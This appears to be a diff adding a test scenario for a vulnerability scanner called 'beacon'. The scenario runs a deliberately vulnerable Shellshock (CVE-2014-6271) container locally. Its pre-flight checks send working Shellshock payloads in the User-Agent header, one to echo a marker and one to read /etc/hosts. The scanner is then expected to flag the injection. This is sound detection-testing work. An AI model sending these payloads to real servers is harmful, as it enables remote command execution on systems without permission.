@@ -1,0 +1,39 @@
+name: cmdinj-shellshock
+description: "Bash Shellshock (CVE-2014-6271) — real command injection in existing vulnerable container"
+tags: [cmdinj, scanner, web, cve, shellshock]
+
+services:
+  vuln-app:
+    image: vulnerables/cve-2014-6271
+    ports: ["9211:80"]
+
+ready:
+  cmd: "curl -sf http://localhost:9211/ >/dev/null"
+  timeout: 60s
+  interval: 3s
+
+assertions:
+  # Pre-flight: verify Shellshock works on this container.
+  - name: exploit-shellshock-command-injection
+    type: command
+    expect:
+      command: "curl -s -H 'User-Agent: () { :;}; echo; echo shellshock-rce-confirmed' http://localhost:9211/cgi-bin/vulnerable | grep -q 'shellshock-rce-confirmed'"
+      exit_code: 0
+
+  - name: exploit-can-read-etc-hosts
+    type: command
+    expect:
+      command: "curl -s -H 'User-Agent: () { :;}; echo; /bin/cat /etc/hosts' http://localhost:9211/cgi-bin/vulnerable | grep -q '127.0.0.1'"
+      exit_code: 0
+
+  # Beacon should detect Shellshock via CGI header injection.
+  - name: beacon-detects-shellshock
+    type: beacon
+    target: localhost:9211
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed"]
+    expect:
+      check_id: web.command_injection
+      evidence_key: cve
+      evidence_value: CVE-2014-6271
+
+timeout: 5m
